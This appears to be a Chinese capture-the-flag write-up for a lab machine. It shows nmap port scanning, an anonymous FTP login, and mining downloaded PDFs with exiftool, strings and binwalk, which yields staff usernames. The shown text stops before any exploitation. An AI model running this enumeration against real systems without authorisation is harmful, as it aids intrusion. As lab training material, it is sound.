# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 11:17 EST
Nmap scan report for codeshield.hmv (192.168.21.5)
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.21.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
|_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home - Elite Economists
MAC Address: 08:00:27:E0:55:E3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms codeshield.hmv (192.168.21.5)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
```

# 漏洞利用

21ftp端口可以匿名登录，发现一些文件，下载下来

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.21.5 
Connected to 192.168.21.5.
220 (vsFTPd 3.0.3)
Name (192.168.21.5:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29836|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
226 Directory send OK.
ftp> mget *
mget Brochure-1.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||11692|)
150 Opening BINARY mode data connection for Brochure-1.pdf (173864 bytes).
100% |************************|   169 KiB   67.81 MiB/s    00:00 ETA
226 Transfer complete.
173864 bytes received in 00:00 (63.33 MiB/s)
mget Brochure-2.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||42118|)
150 Opening BINARY mode data connection for Brochure-2.pdf (183931 bytes).
100% |************************|   179 KiB  155.50 MiB/s    00:00 ETA
226 Transfer complete.
183931 bytes received in 00:00 (120.14 MiB/s)
mget Financial-infographics-poster.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||48184|)
150 Opening BINARY mode data connection for Financial-infographics-poster.pdf (465409 bytes).
100% |************************|   454 KiB  197.35 MiB/s    00:00 ETA
226 Transfer complete.
465409 bytes received in 00:00 (168.44 MiB/s)
mget Gameboard-poster.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||7788|)
150 Opening BINARY mode data connection for Gameboard-poster.pdf (269546 bytes).
100% |************************|   263 KiB  164.78 MiB/s    00:00 ETA
226 Transfer complete.
269546 bytes received in 00:00 (124.42 MiB/s)
mget Growth-timeline.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||33429|)
150 Opening BINARY mode data connection for Growth-timeline.pdf (126644 bytes).
100% |************************|   123 KiB  105.20 MiB/s    00:00 ETA
226 Transfer complete.
126644 bytes received in 00:00 (90.53 MiB/s)
mget Population-poster.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||46508|)
150 Opening BINARY mode data connection for Population-poster.pdf (1170323 bytes).
100% |************************|  1142 KiB  264.22 MiB/s    00:00 ETA
226 Transfer complete.
1170323 bytes received in 00:00 (251.65 MiB/s)
```

看一下都有什么

```
┌──(kali㉿kali)-[~]
└─$ exiftool *.pdf    
======== Brochure-1.pdf
ExifTool Version Number         : 13.25
File Name                       : Brochure-1.pdf
Directory                       : .
File Size                       : 174 kB
File Modification Date/Time     : 2023:09:13 07:40:45-04:00
File Access Date/Time           : 2026:03:06 11:21:12-05:00
File Inode Change Date/Time     : 2026:03:06 11:21:12-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 2
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : We are here for your wealth
Title                           : Elite Economists brochure 1
Author                          : joseph
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 12:03:17+02:00
======== Brochure-2.pdf
ExifTool Version Number         : 13.25
File Name                       : Brochure-2.pdf
Directory                       : .
File Size                       : 184 kB
File Modification Date/Time     : 2023:09:13 07:37:34-04:00
File Access Date/Time           : 2026:03:06 11:21:13-05:00
File Inode Change Date/Time     : 2026:03:06 11:21:13-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 2
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : We are here for your wealth
Title                           : Elite Economists brochure 2
Author                          : richard
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 12:01:44+02:00
======== Financial-infographics-poster.pdf
ExifTool Version Number         : 13.25
File Name                       : Financial-infographics-poster.pdf
Directory                       : .
File Size                       : 465 kB
File Modification Date/Time     : 2023:09:13 10:18:58-04:00
File Access Date/Time           : 2026:03:06 11:21:14-05:00
File Inode Change Date/Time     : 2026:03:06 11:21:14-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 1
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : Save money
Title                           : Elite Economists Finance poster
Author                          : crystal
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 10:34:40+02:00
======== Gameboard-poster.pdf
ExifTool Version Number         : 13.25
File Name                       : Gameboard-poster.pdf
Directory                       : .
File Size                       : 270 kB
File Modification Date/Time     : 2023:09:13 10:19:51-04:00
File Access Date/Time           : 2026:03:06 11:21:14-05:00
File Inode Change Date/Time     : 2026:03:06 11:21:14-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 1
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : Budget game
Title                           : Elite Economists Gameboard
Author                          : catherine
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 12:09:43+02:00
======== Growth-timeline.pdf
ExifTool Version Number         : 13.25
File Name                       : Growth-timeline.pdf
Directory                       : .
File Size                       : 127 kB
File Modification Date/Time     : 2023:09:13 10:20:31-04:00
File Access Date/Time           : 2026:03:06 11:21:14-05:00
File Inode Change Date/Time     : 2026:03:06 11:21:14-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 1
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : Timeline
Title                           : Elite Economists Timeline
Author                          : catherine
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 11:58:04+02:00
======== Population-poster.pdf
ExifTool Version Number         : 13.25
File Name                       : Population-poster.pdf
Directory                       : .
File Size                       : 1170 kB
File Modification Date/Time     : 2023:09:13 06:13:32-04:00
File Access Date/Time           : 2026:03:06 11:21:15-05:00
File Inode Change Date/Time     : 2026:03:06 11:21:15-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 1
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 12:13:30+02:00
    6 image files read
┌──(kali㉿kali)-[~]
└─$ strings *.pdf | grep pass
                                                                     
┌──(kali㉿kali)-[~]
└─$ strings *.pdf | grep user

┌──(kali㉿kali)-[~]
└─$ binwalk *.pdf             

Scan Time:     2026-03-06 11:25:13
Target File:   /home/kali/Brochure-1.pdf
MD5 Checksum:  6f99c5a1ddf29ad90151b697763522ab
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.6"
71            0x47            Zlib compressed data, default compression
1412          0x584           JPEG image data, JFIF standard 1.01
19951         0x4DEF          Zlib compressed data, default compression
31413         0x7AB5          JPEG image data, JFIF standard 1.01
85945         0x14FB9         Zlib compressed data, default compression
87419         0x1557B         JPEG image data, JFIF standard 1.01
109562        0x1ABFA         JPEG image data, JFIF standard 1.01
140827        0x2261B         JPEG image data, JFIF standard 1.01
153298        0x256D2         Zlib compressed data, default compression
167106        0x28CC2         Zlib compressed data, default compression


Scan Time:     2026-03-06 11:25:13
Target File:   /home/kali/Brochure-2.pdf
MD5 Checksum:  92562d175e414dd263e8a888f1b220b2
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.6"
71            0x47            Zlib compressed data, default compression
1538          0x602           JPEG image data, JFIF standard 1.01
13251         0x33C3          Zlib compressed data, default compression
24712         0x6088          JPEG image data, JFIF standard 1.01
92028         0x1677C         Zlib compressed data, default compression
93373         0x16CBD         JPEG image data, JFIF standard 1.01
115253        0x1C235         JPEG image data, JFIF standard 1.01
146337        0x23BA1         JPEG image data, JFIF standard 1.01
158508        0x26B2C         Zlib compressed data, default compression
172328        0x2A128         Zlib compressed data, default compression
173251        0x2A4C3         Zlib compressed data, default compression
177511        0x2B567         Zlib compressed data, default compression


Scan Time:     2026-03-06 11:25:13
Target File:   /home/kali/Financial-infographics-poster.pdf
MD5 Checksum:  2de3fa5d91da4970b12398e9dc77b55a
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.6"
71            0x47            Zlib compressed data, default compression
1831          0x727           Zlib compressed data, default compression
3631          0xE2F           Zlib compressed data, default compression
5313          0x14C1          Zlib compressed data, default compression
7761          0x1E51          Zlib compressed data, default compression
9515          0x252B          Zlib compressed data, default compression
12724         0x31B4          Zlib compressed data, default compression
17217         0x4341          Zlib compressed data, default compression
19961         0x4DF9          Zlib compressed data, default compression
22764         0x58EC          Zlib compressed data, default compression
25524         0x63B4          Zlib compressed data, default compression
29073         0x7191          Zlib compressed data, default compression
31272         0x7A28          Zlib compressed data, default compression
34345         0x8629          Zlib compressed data, default compression
34637         0x874D          Zlib compressed data, default compression
34913         0x8861          Zlib compressed data, default compression
35199         0x897F          Zlib compressed data, default compression
35484         0x8A9C          JPEG image data, JFIF standard 1.01
42331         0xA55B          Zlib compressed data, default compression
46841         0xB6F9          JPEG image data, JFIF standard 1.01
52995         0xCF03          Zlib compressed data, default compression
55386         0xD85A          JPEG image data, JFIF standard 1.01
60744         0xED48          Zlib compressed data, default compression
62517         0xF435          JPEG image data, JFIF standard 1.01
69269         0x10E95         Zlib compressed data, default compression
72084         0x11994         JPEG image data, JFIF standard 1.01
78491         0x1329B         Zlib compressed data, default compression
80888         0x13BF8         JPEG image data, JFIF standard 1.01
105634        0x19CA2         Zlib compressed data, default compression
115209        0x1C209         JPEG image data, JFIF standard 1.01
135532        0x2116C         Zlib compressed data, default compression
143839        0x231DF         JPEG image data, JFIF standard 1.01
265410        0x40CC2         Zlib compressed data, default compression
321930        0x4E98A         JPEG image data, JFIF standard 1.01
331194        0x50DBA         Zlib compressed data, default compression
334977        0x51C81         JPEG image data, JFIF standard 1.01
344299        0x540EB         Zlib compressed data, default compression
348082        0x54FB2         JPEG image data, JFIF standard 1.01
358618        0x578DA         Zlib compressed data, default compression
362401        0x587A1         JPEG image data, JFIF standard 1.01
372633        0x5AF99         Zlib compressed data, default compression
376416        0x5BE60         JPEG image data, JFIF standard 1.01
386630        0x5E646         Zlib compressed data, default compression
390347        0x5F4CB         JPEG image data, JFIF standard 1.01
401508        0x62064         Zlib compressed data, default compression
405225        0x62EE9         JPEG image data, JFIF standard 1.01
416936        0x65CA8         Zlib compressed data, default compression
420653        0x66B2D         JPEG image data, JFIF standard 1.01
431585        0x695E1         Zlib compressed data, default compression
435214        0x6A40E         Zlib compressed data, default compression
442720        0x6C160         Zlib compressed data, default compression
443283        0x6C393         Zlib compressed data, default compression
446095        0x6CE8F         Zlib compressed data, default compression
446609        0x6D091         Zlib compressed data, default compression
451566        0x6E3EE         Zlib compressed data, default compression
452248        0x6E698         Zlib compressed data, default compression
457314        0x6FA62         Zlib compressed data, default compression


Scan Time:     2026-03-06 11:25:13
Target File:   /home/kali/Gameboard-poster.pdf
MD5 Checksum:  10c12291e8636c0216012fee57fc3249
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.6"
71            0x47            Zlib compressed data, default compression
20109         0x4E8D          JPEG image data, JFIF standard 1.01
26198         0x6656          Zlib compressed data, default compression
32395         0x7E8B          JPEG image data, JFIF standard 1.01
39474         0x9A32          Zlib compressed data, default compression
47440         0xB950          JPEG image data, JFIF standard 1.01
53840         0xD250          Zlib compressed data, default compression
60544         0xEC80          JPEG image data, JFIF standard 1.01
135346        0x210B2         Zlib compressed data, default compression
168681        0x292E9         JPEG image data, JFIF standard 1.01
177502        0x2B55E         Zlib compressed data, default compression
181295        0x2C42F         JPEG image data, JFIF standard 1.01
194617        0x2F839         Zlib compressed data, default compression
210709        0x33715         JPEG image data, JFIF standard 1.01
219478        0x35956         Zlib compressed data, default compression
226931        0x37673         JPEG image data, JFIF standard 1.01
232280        0x38B58         Zlib compressed data, default compression
236867        0x39D43         Zlib compressed data, default compression
249042        0x3CCD2         Zlib compressed data, default compression
249855        0x3CFFF         Zlib compressed data, default compression
262529        0x40181         Zlib compressed data, default compression


Scan Time:     2026-03-06 11:25:13
Target File:   /home/kali/Growth-timeline.pdf
MD5 Checksum:  427583464f99eff80529134a34858836
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.6"
71            0x47            Zlib compressed data, default compression
4340          0x10F4          JPEG image data, JFIF standard 1.01
10917         0x2AA5          Zlib compressed data, default compression
17540         0x4484          JPEG image data, JFIF standard 1.01
18520         0x4858          Zlib compressed data, default compression
25997         0x658D          JPEG image data, JFIF standard 1.01
26977         0x6961          Zlib compressed data, default compression
33053         0x811D          JPEG image data, JFIF standard 1.01
34033         0x84F1          Zlib compressed data, default compression
44130         0xAC62          JPEG image data, JFIF standard 1.01
45110         0xB036          Zlib compressed data, default compression
55152         0xD770          JPEG image data, JFIF standard 1.01
56132         0xDB44          Zlib compressed data, default compression
66538         0x103EA         JPEG image data, JFIF standard 1.01
67518         0x107BE         Zlib compressed data, default compression
78265         0x131B9         JPEG image data, JFIF standard 1.01
79245         0x1358D         Zlib compressed data, default compression
87928         0x15778         JPEG image data, JFIF standard 1.01
88908         0x15B4C         Zlib compressed data, default compression
96044         0x1772C         Zlib compressed data, default compression
96560         0x17930         Zlib compressed data, default compression
97078         0x17B36         Zlib compressed data, default compression
97598         0x17D3E         Zlib compressed data, default compression
98121         0x17F49         Zlib compressed data, default compression
98522         0x180DA         Zlib compressed data, default compression
108819        0x1A913         Zlib compressed data, default compression
109524        0x1ABD4         Zlib compressed data, default compression
119609        0x1D339         Zlib compressed data, default compression


Scan Time:     2026-03-06 11:25:13
Target File:   /home/kali/Population-poster.pdf
MD5 Checksum:  8fb974c4e78645f715e7a585fcee2322
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PDF document, version: "1.6"
71            0x47            Zlib compressed data, default compression
339918        0x52FCE         Zlib compressed data, default compression
350442        0x558EA         Zlib compressed data, default compression
354550        0x568F6         JPEG image data, JFIF standard 1.01
366670        0x5984E         Zlib compressed data, default compression
374054        0x5B526         JPEG image data, JFIF standard 1.01
386559        0x5E5FF         Zlib compressed data, default compression
395110        0x60766         JPEG image data, JFIF standard 1.01
429238        0x68CB6         Zlib compressed data, default compression
451600        0x6E410         JPEG image data, JFIF standard 1.01
460248        0x705D8         Zlib compressed data, default compression
464230        0x71566         JPEG image data, JFIF standard 1.01
472742        0x736A6         Zlib compressed data, default compression
476682        0x7460A         JPEG image data, JFIF standard 1.01
485988        0x76A64         Zlib compressed data, default compression
489917        0x779BD         Zlib compressed data, default compression
490861        0x77D6D         Zlib compressed data, default compression
491807        0x7811F         Zlib compressed data, default compression
493098        0x7862A         Zlib compressed data, default compression
494390        0x78B36         Zlib compressed data, default compression
496697        0x79439         Zlib compressed data, default compression
499002        0x79D3A         Zlib compressed data, default compression
499847        0x7A087         Zlib compressed data, default compression
500692        0x7A3D4         Zlib compressed data, default compression
501606        0x7A766         Zlib compressed data, default compression
502521        0x7AAF9         Zlib compressed data, default compression
503256        0x7ADD8         Zlib compressed data, default compression
503992        0x7B0B8         Zlib compressed data, default compression
505471        0x7B67F         Zlib compressed data, default compression
506950        0x7BC46         Zlib compressed data, default compression
508832        0x7C3A0         Zlib compressed data, default compression
510713        0x7CAF9         Zlib compressed data, default compression
511181        0x7CCCD         Zlib compressed data, default compression
511649        0x7CEA1         Zlib compressed data, default compression
513286        0x7D506         Zlib compressed data, default compression
514924        0x7DB6C         Zlib compressed data, default compression
521404        0x7F4BC         Zlib compressed data, default compression
527883        0x80E0B         Zlib compressed data, default compression
528586        0x810CA         Zlib compressed data, default compression
529289        0x81389         Zlib compressed data, default compression
532009        0x81E29         Zlib compressed data, default compression
534729        0x828C9         Zlib compressed data, default compression
535390        0x82B5E         Zlib compressed data, default compression
536051        0x82DF3         Zlib compressed data, default compression
538048        0x835C0         Zlib compressed data, default compression
540044        0x83D8C         Zlib compressed data, default compression
541081        0x84199         Zlib compressed data, default compression
542118        0x845A6         Zlib compressed data, default compression
543464        0x84AE8         Zlib compressed data, default compression
544812        0x8502C         Zlib compressed data, default compression
546802        0x857F2         Zlib compressed data, default compression
548791        0x85FB7         Zlib compressed data, default compression
549555        0x862B3         Zlib compressed data, default compression
550319        0x865AF         Zlib compressed data, default compression
550676        0x86714         Zlib compressed data, default compression
551031        0x86877         Zlib compressed data, default compression
551679        0x86AFF         Zlib compressed data, default compression
552330        0x86D8A         Zlib compressed data, default compression
553698        0x872E2         Zlib compressed data, default compression
555066        0x8783A         Zlib compressed data, default compression
556525        0x87DED         Zlib compressed data, default compression
557983        0x8839F         Zlib compressed data, default compression
558909        0x8873D         Zlib compressed data, default compression
559836        0x88ADC         Zlib compressed data, default compression
560358        0x88CE6         Zlib compressed data, default compression
560880        0x88EF0         Zlib compressed data, default compression
561670        0x89206         Zlib compressed data, default compression
562459        0x8951B         Zlib compressed data, default compression
563114        0x897AA         Zlib compressed data, default compression
563771        0x89A3B         Zlib compressed data, default compression
566308        0x8A424         Zlib compressed data, default compression
568844        0x8AE0C         Zlib compressed data, default compression
569247        0x8AF9F         Zlib compressed data, default compression
569916        0x8B23C         Zlib compressed data, default compression
570587        0x8B4DB         Zlib compressed data, default compression
572371        0x8BBD3         Zlib compressed data, default compression
574155        0x8C2CB         Zlib compressed data, default compression
574720        0x8C500         Zlib compressed data, default compression
575286        0x8C736         Zlib compressed data, default compression
577035        0x8CE0B         Zlib compressed data, default compression
578783        0x8D4DF         Zlib compressed data, default compression
579525        0x8D7C5         Zlib compressed data, default compression
580267        0x8DAAB         Zlib compressed data, default compression
582090        0x8E1CA         Zlib compressed data, default compression
583911        0x8E8E7         Zlib compressed data, default compression
585049        0x8ED59         Zlib compressed data, default compression
586189        0x8F1CD         Zlib compressed data, default compression
586904        0x8F498         Zlib compressed data, default compression
587618        0x8F762         Zlib compressed data, default compression
588193        0x8F9A1         Zlib compressed data, default compression
588769        0x8FBE1         Zlib compressed data, default compression
589444        0x8FE84         Zlib compressed data, default compression
590119        0x90127         Zlib compressed data, default compression
590714        0x9037A         Zlib compressed data, default compression
591309        0x905CD         Zlib compressed data, default compression
592132        0x90904         Zlib compressed data, default compression
592956        0x90C3C         Zlib compressed data, default compression
594379        0x911CB         Zlib compressed data, default compression
595800        0x91758         Zlib compressed data, default compression
596290        0x91942         Zlib compressed data, default compression
596783        0x91B2F         Zlib compressed data, default compression
628101        0x99585         Zlib compressed data, default compression
659417        0xA0FD9         Zlib compressed data, default compression
660385        0xA13A1         Zlib compressed data, default compression
661353        0xA1769         Zlib compressed data, default compression
661713        0xA18D1         Zlib compressed data, default compression
662073        0xA1A39         Zlib compressed data, default compression
662434        0xA1BA2         Zlib compressed data, default compression
662795        0xA1D0B         Zlib compressed data, default compression
663522        0xA1FE2         Zlib compressed data, default compression
664249        0xA22B9         Zlib compressed data, default compression
665310        0xA26DE         Zlib compressed data, default compression
666372        0xA2B04         Zlib compressed data, default compression
668980        0xA3534         Zlib compressed data, default compression
671587        0xA3F63         Zlib compressed data, default compression
673322        0xA462A         Zlib compressed data, default compression
675057        0xA4CF1         Zlib compressed data, default compression
675943        0xA5067         Zlib compressed data, default compression
676830        0xA53DE         Zlib compressed data, default compression
678840        0xA5BB8         Zlib compressed data, default compression
680849        0xA6391         Zlib compressed data, default compression
681762        0xA6722         Zlib compressed data, default compression
682676        0xA6AB4         Zlib compressed data, default compression
684096        0xA7040         Zlib compressed data, default compression
685515        0xA75CB         Zlib compressed data, default compression
686507        0xA79AB         Zlib compressed data, default compression
687500        0xA7D8C         Zlib compressed data, default compression
695264        0xA9BE0         Zlib compressed data, default compression
703025        0xABA31         Zlib compressed data, default compression
703876        0xABD84         Zlib compressed data, default compression
704730        0xAC0DA         Zlib compressed data, default compression
706034        0xAC5F2         Zlib compressed data, default compression
707337        0xACB09         Zlib compressed data, default compression
708238        0xACE8E         Zlib compressed data, default compression
709139        0xAD213         Zlib compressed data, default compression
709858        0xAD4E2         Zlib compressed data, default compression
710578        0xAD7B2         Zlib compressed data, default compression
712512        0xADF40         Zlib compressed data, default compression
714445        0xAE6CD         Zlib compressed data, default compression
715166        0xAE99E         Zlib compressed data, default compression
715887        0xAEC6F         Zlib compressed data, default compression
716429        0xAEE8D         Zlib compressed data, default compression
716971        0xAF0AB         Zlib compressed data, default compression
718103        0xAF517         Zlib compressed data, default compression
719235        0xAF983         Zlib compressed data, default compression
719616        0xAFB00         Zlib compressed data, default compression
721211        0xB013B         Zlib compressed data, default compression
722806        0xB0776         Zlib compressed data, default compression
723785        0xB0B49         Zlib compressed data, default compression
724765        0xB0F1D         Zlib compressed data, default compression
726411        0xB158B         Zlib compressed data, default compression
728055        0xB1BF7         Zlib compressed data, default compression
728397        0xB1D4D         Zlib compressed data, default compression
728740        0xB1EA4         Zlib compressed data, default compression
729350        0xB2106         Zlib compressed data, default compression
729961        0xB2369         Zlib compressed data, default compression
733187        0xB3003         Zlib compressed data, default compression
736410        0xB3C9A         Zlib compressed data, default compression
736770        0xB3E02         Zlib compressed data, default compression
737132        0xB3F6C         Zlib compressed data, default compression
738015        0xB42DF         Zlib compressed data, default compression
738899        0xB4653         Zlib compressed data, default compression
740181        0xB4B55         Zlib compressed data, default compression
741463        0xB5057         Zlib compressed data, default compression
742823        0xB55A7         Zlib compressed data, default compression
744182        0xB5AF6         Zlib compressed data, default compression
745059        0xB5E63         Zlib compressed data, default compression
745937        0xB61D1         Zlib compressed data, default compression
747341        0xB674D         Zlib compressed data, default compression
748743        0xB6CC7         Zlib compressed data, default compression
749281        0xB6EE1         Zlib compressed data, default compression
749820        0xB70FC         Zlib compressed data, default compression
750206        0xB727E         Zlib compressed data, default compression
750855        0xB7507         Zlib compressed data, default compression
751501        0xB778D         Zlib compressed data, default compression
751831        0xB78D7         Zlib compressed data, default compression
752164        0xB7A24         Zlib compressed data, default compression
753390        0xB7EEE         Zlib compressed data, default compression
754616        0xB83B8         Zlib compressed data, default compression
755304        0xB8668         Zlib compressed data, default compression
755992        0xB8918         Zlib compressed data, default compression
756460        0xB8AEC         Zlib compressed data, default compression
756927        0xB8CBF         Zlib compressed data, default compression
757419        0xB8EAB         Zlib compressed data, default compression
757912        0xB9098         Zlib compressed data, default compression
758672        0xB9390         Zlib compressed data, default compression
759432        0xB9688         Zlib compressed data, default compression
760377        0xB9A39         Zlib compressed data, default compression
761320        0xB9DE8         Zlib compressed data, default compression
762413        0xBA22D         Zlib compressed data, default compression
763508        0xBA674         Zlib compressed data, default compression
763977        0xBA849         Zlib compressed data, default compression
764445        0xBAA1D         Zlib compressed data, default compression
765550        0xBAE6E         Zlib compressed data, default compression
766657        0xBB2C1         Zlib compressed data, default compression
770264        0xBC0D8         Zlib compressed data, default compression
773869        0xBCEED         Zlib compressed data, default compression
774407        0xBD107         Zlib compressed data, default compression
774946        0xBD322         Zlib compressed data, default compression
777893        0xBDEA5         Zlib compressed data, default compression
780839        0xBEA27         Zlib compressed data, default compression
781281        0xBEBE1         Zlib compressed data, default compression
781723        0xBED9B         Zlib compressed data, default compression
782562        0xBF0E2         Zlib compressed data, default compression
783403        0xBF42B         Zlib compressed data, default compression
785279        0xBFB7F         Zlib compressed data, default compression
787154        0xC02D2         Zlib compressed data, default compression
787729        0xC0511         Zlib compressed data, default compression
788304        0xC0750         Zlib compressed data, default compression
789410        0xC0BA2         Zlib compressed data, default compression
790516        0xC0FF4         Zlib compressed data, default compression
791521        0xC13E1         Zlib compressed data, default compression
792526        0xC17CE         Zlib compressed data, default compression
794589        0xC1FDD         Zlib compressed data, default compression
796653        0xC27ED         Zlib compressed data, default compression
804160        0xC4540         Zlib compressed data, default compression
811663        0xC628F         Zlib compressed data, default compression
814959        0xC6F6F         Zlib compressed data, default compression
818258        0xC7C52         Zlib compressed data, default compression
819906        0xC82C2         Zlib compressed data, default compression
821553        0xC8931         Zlib compressed data, default compression
822229        0xC8BD5         Zlib compressed data, default compression
822903        0xC8E77         Zlib compressed data, default compression
823244        0xC8FCC         Zlib compressed data, default compression
823897        0xC9259         Zlib compressed data, default compression
824550        0xC94E6         Zlib compressed data, default compression
825080        0xC96F8         Zlib compressed data, default compression
825609        0xC9909         Zlib compressed data, default compression
826154        0xC9B2A         Zlib compressed data, default compression
826700        0xC9D4C         Zlib compressed data, default compression
827613        0xCA0DD         Zlib compressed data, default compression
828526        0xCA46E         Zlib compressed data, default compression
828998        0xCA646         Zlib compressed data, default compression
829469        0xCA81D         Zlib compressed data, default compression
830458        0xCABFA         Zlib compressed data, default compression
831448        0xCAFD8         Zlib compressed data, default compression
832056        0xCB238         Zlib compressed data, default compression
832665        0xCB499         Zlib compressed data, default compression
845173        0xCE575         Zlib compressed data, default compression
857680        0xD1650         Zlib compressed data, default compression
859361        0xD1CE1         Zlib compressed data, default compression
861042        0xD2372         Zlib compressed data, default compression
861848        0xD2698         Zlib compressed data, default compression
862654        0xD29BE         Zlib compressed data, default compression
863968        0xD2EE0         Zlib compressed data, default compression
865281        0xD3401         Zlib compressed data, default compression
866057        0xD3709         Zlib compressed data, default compression
866834        0xD3A12         Zlib compressed data, default compression
867299        0xD3BE3         Zlib compressed data, default compression
867764        0xD3DB4         Zlib compressed data, default compression
868720        0xD4170         Zlib compressed data, default compression
869676        0xD452C         Zlib compressed data, default compression
870244        0xD4764         Zlib compressed data, default compression
870813        0xD499D         Zlib compressed data, default compression
873017        0xD5239         Zlib compressed data, default compression
875221        0xD5AD5         Zlib compressed data, default compression
877042        0xD61F2         Zlib compressed data, default compression
878862        0xD690E         Zlib compressed data, default compression
879315        0xD6AD3         Zlib compressed data, default compression
879768        0xD6C98         Zlib compressed data, default compression
880561        0xD6FB1         Zlib compressed data, default compression
881353        0xD72C9         Zlib compressed data, default compression
881689        0xD7419         Zlib compressed data, default compression
882805        0xD7875         Zlib compressed data, default compression
883921        0xD7CD1         Zlib compressed data, default compression
884755        0xD8013         Zlib compressed data, default compression
885589        0xD8355         Zlib compressed data, default compression
886442        0xD86AA         Zlib compressed data, default compression
887295        0xD89FF         Zlib compressed data, default compression
